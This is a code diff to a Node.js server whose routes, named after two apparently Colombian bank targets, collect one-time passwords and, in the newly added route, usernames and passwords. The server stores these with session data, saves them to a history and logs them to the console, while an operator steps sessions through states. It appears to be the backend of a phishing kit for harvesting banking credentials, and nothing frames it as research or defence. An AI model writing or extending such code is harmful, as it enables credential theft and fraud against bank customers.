@@ -372,8 +372,6 @@ const server = http.createServer(async (req, res) => {
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
 
-                    // 🔥 SE ELIMINÓ EL BORRADO DE DATOS AL PRESIONAR BOTONES
-                    
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
                     console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -591,7 +589,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================================
-        // 🔥 RUTA 4: Enviar OTP (Cambia a 'pendiente' para que app.js no recargue)
+        // 🔥 RUTA 4: Enviar OTP
         // ============================================================
         const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
         if (req.method === 'POST' && ccOtpMatch) {
@@ -602,7 +600,7 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
                 const datosOriginales = datosSesiones.get(sessionId) || {};
                 const datosCompletos = Object.assign({}, datosOriginales, { otp });
-                estadoSesiones.set(sessionId, 'pendiente'); // 🔥 SE CAMBIA A PENDIENTE
+                estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
 
@@ -610,6 +608,37 @@ const server = http.createServer(async (req, res) => {
 
                 console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
                 json(res, 200, { ok: true, sessionId, bancoKey });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // ============================================================
+        // 🔥 RUTA 5: Enviar Autorización (LA QUE FALTABA)
+        // ============================================================
+        const authMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-autorizacion$/);
+        if (req.method === 'POST' && authMatch) {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const bancoKey = 'cc-' + authMatch[1];
+                const { sessionId, usuario, password } = await getBody(req);
+                if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
+
+                const datosPrevios = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosPrevios, {
+                    authUsuario: usuario,
+                    authPassword: password,
+                    authEnviadoEn: new Date().toISOString()
+                });
+
+                datosSesiones.set(sessionId, datosCompletos);
+                estadoSesiones.set(sessionId, 'autorizacion_enviada');
+                ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
+
+                guardarHistorial(bancoKey, datosCompletos);
+                agregarLog('autorizacion', { sessionId, usuario });
+
+                console.log(`[${bancoKey}] Autorización: ${sessionId} → usuario=${usuario}`);
+                json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
